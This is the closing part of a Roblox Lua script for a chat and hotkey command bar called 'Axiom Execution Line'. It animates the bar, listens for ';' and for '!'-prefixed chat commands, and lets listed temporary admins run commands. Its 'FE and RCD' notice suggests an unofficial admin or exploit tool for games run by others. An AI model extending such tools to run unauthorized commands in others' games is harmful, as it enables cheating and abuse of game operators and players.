	local function closeCmdBar()
		animationToken += 1
		local myToken = animationToken

		task.spawn(function()
			playTween(TopLine, TOPLINE_CLOSE_INFO, {
				Size = UDim2.new(0, 0, 0, 3),
				Position = UDim2.new(0.5, 0, 1, 0),
			})

			task.wait(TOPLINE_CLOSE_INFO.Time)
			AdminTitle.Visible = false
			if animationToken ~= myToken then return end

			playTween(Background, BG_CLOSE_INFO, {
				Position = UDim2.new(0.5, 0, 2, 0),
				BackgroundTransparency = 1,
			})

			task.wait(BG_CLOSE_INFO.Time)

			if animationToken ~= myToken then return end

			Background.Visible = false
		end)
	end

	FocusBar:GetPropertyChangedSignal("Text"):Connect(UpdateSuggestions)
	FocusBar:GetPropertyChangedSignal("Text"):Connect(UpdateGhostText)
	FocusBar:GetPropertyChangedSignal("Text"):Connect(function()
		firesound(133003979061644)
	end)
	FocusBar.Focused:connect(function()
		openCmdBar()
		FocusBar.Text = ""
		GhostLabel.Text = ""
	end)
	FocusBar.FocusLost:connect(function(enterPressed)
		local text = FocusBar.Text
		FocusBar.Text = ""
		GhostLabel.Text = ""
		closeCmdBar()
		if enterPressed then
			sendCMD(text)
		end
		wait()
	end)
	adminConnections.keyconnectcheck = game:GetService("Players").LocalPlayer:GetMouse().KeyDown:connect(function(input)
		if (input == ";") then
			FocusBar:CaptureFocus()
			wait()
		end
	end)
	local TextChatService = game:GetService("TextChatService")
	TextChatService.OnIncomingMessage = function(message)
		if adminConnections.textchatconnect == false then return end
		if not message.TextSource then return end

		local senderId = message.TextSource.UserId
		local text = message.Text

		if text:sub(1, 1) ~= "!" then return end
		text = text:sub(2):gsub("^%s+", "")

		if senderId == plr.UserId then
			if message.Status ~= Enum.TextChatMessageStatus.Success then return end
			sendCMD(text)

		elseif TempAdminUserIds[senderId] then
			sendCMD(text)
		end
	end
	notice("Axiom Execution Line Has Fully Loaded. Enjoy the premium experience of FE and RCD.")
	notice([[Chat Prefix is !
Whille Execution Line Prefix is ;]])
end
coroutine.wrap(LUFLUDB_fake_script)()
